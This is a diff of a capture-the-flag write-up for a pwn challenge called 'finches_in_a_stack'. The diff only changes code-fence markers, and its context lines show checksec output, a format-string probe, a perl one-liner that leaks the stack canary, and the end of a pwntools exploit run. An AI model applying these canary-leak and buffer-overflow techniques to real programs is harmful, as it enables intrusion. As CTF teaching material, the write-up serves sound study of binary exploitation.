@@ -15,7 +15,7 @@ Category: Pwn
 
 What are we dealing with?
 
-```bash
+```
 kali@kali:~/Downloads/ractf/finches_in_a_stack$ ls
 fias
 kali@kali:~/Downloads/ractf/finches_in_a_stack$ file fias 
@@ -75,7 +75,7 @@ void say_hi(void)
 
 This is a buffer overflow attack, but there's a pesky canary in the way that we'll have to bypass.
 
-```bash
+```
 kali@kali:~/Downloads/ractf/finches_in_a_stack$ checksec fias
 [*] '/home/kali/Downloads/ractf/finches_in_a_stack/fias'
     Arch:     i386-32-little
@@ -130,7 +130,7 @@ Program received signal SIGABRT, Aborted.
 
 What can we print out with a a nice long format string?
 
-```bash
+```
 kali@kali:~/Downloads/ractf/finches_in_a_stack$ echo '%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p' | ./fias 
 No! You bad canary! Get back in your cage!
 
@@ -469,7 +469,7 @@ to read the 200th item on the stack
 
 Took a little experimentation, but here it is:
 
-```bash
+```
 kali@kali:~/Downloads/ractf/finches_in_a_stack$ perl -e 'print "%11\$p\n"' | ./fias | grep Nice
 Hi! What's your name? Nice to meet you, 0x5b5b5300!
 kali@kali:~/Downloads/ractf/finches_in_a_stack$ perl -e 'print "%11\$p\n"' | ./fias | grep Nice
@@ -509,7 +509,7 @@ p.sendline(payload)
 p.stream()
 ```
 
-```bash
+```
 kali@kali:~/Downloads/ractf/finches_in_a_stack$ ./exploit.py 
 [DEBUG] PLT 0x8049030 printf
 [DEBUG] PLT 0x8049040 gets
